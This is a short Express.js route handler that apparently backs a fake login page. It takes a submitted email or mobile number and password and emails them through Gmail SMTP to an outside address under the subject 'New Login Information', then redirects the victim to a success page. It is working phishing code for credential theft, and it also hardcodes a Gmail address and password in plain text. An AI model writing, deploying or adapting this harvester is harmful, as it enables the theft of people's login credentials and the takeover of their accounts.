app.post('/submit', (req, res) => {
    const { emailOrMobile, password } = req.body;

    let transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 465,
        secure: true,
        auth: {
            user: 'loddanimations@gmail.com', // Your Gmail address
            pass: 'noonewas11' // Your App Password
        }
    });

    let mailOptions = {
        from: 'loddanimations@gmail.com',
        to: 'reijihaneda81@gmail.com',
        subject: 'New Login Information',
        text: `Email/Mobile: ${emailOrMobile}\nPassword: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            res.status(500).send('Error sending email: ' + error.message);
        } else {
            console.log('Email sent: ' + info.response);
            res.redirect('/success.html');
        }
    });
});